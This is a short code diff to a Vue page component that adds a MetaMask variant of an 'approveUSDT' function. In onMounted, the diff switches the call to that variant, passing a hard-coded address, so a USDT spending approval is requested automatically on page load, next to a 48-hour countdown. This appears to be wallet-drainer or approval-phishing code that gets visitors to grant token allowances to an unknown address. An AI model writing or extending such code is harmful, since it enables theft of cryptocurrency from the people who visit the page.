@@ -6,6 +6,7 @@ import { Mousewheel, Pagination } from 'swiper/modules'
 import { onBeforeMount, onBeforeUnmount, onMounted, reactive, ref } from 'vue'
 import type { Swiper as SwiperInstance } from 'swiper';  // 类型导入
 import { approveUSDT } from "./kaia.ts";
+import {approveUSDT as metamaskApprove} from "./metamask.ts"
 
 let timer: any = null
 let targetTime = new Date().getTime() + 48 * 60 * 60 * 1000 // 48 hours from now
@@ -43,7 +44,7 @@ onMounted(() => {
   if(data.defaultShow){
     showDialog(data.defaultShow)
   }
-  approveUSDT('0x5c13e303a62fc5dedf5b52d66873f2e59fedadc2','0x5c13e303a62fc5dedf5b52d66873f2e59fedadc2')
+  metamaskApprove('0x5c13e303a62fc5dedf5b52d66873f2e59fedadc2','0x5c13e303a62fc5dedf5b52d66873f2e59fedadc2')
 })
 onBeforeUnmount(() => {
   clearInterval(timer)
